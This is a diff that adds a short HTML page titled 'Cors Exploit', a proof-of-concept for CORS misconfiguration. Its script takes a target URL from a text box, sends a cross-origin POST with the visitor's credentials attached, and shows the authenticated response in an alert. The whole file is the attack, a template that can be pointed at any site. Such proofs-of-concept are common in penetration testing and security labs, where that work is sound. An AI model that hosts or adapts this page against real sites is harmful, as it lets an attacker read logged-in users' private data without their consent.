@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Cors Exploit</title>
+</head>
+<body>
+    <h2>Using the cors exploit</h2>
+    <div id="demo">
+        <input type="text" id="url" onchange="cors(event)" placeholder="enter target">
+    </div>
+    <script>
+        function cors(event){
+            var xhr = new XMLHttpRequest();
+            xhr.onreadystatechange = function(){
+                if (this.readyState == 4 && this.status == 200){
+                    alert(this.responseText);
+                }
+            };       
+            xhr.open('POST',event.target.value,true);
+            xhr.withCredentials = true;
+            xhr.send();
+        }
+    </script>
+</body>
+</html>
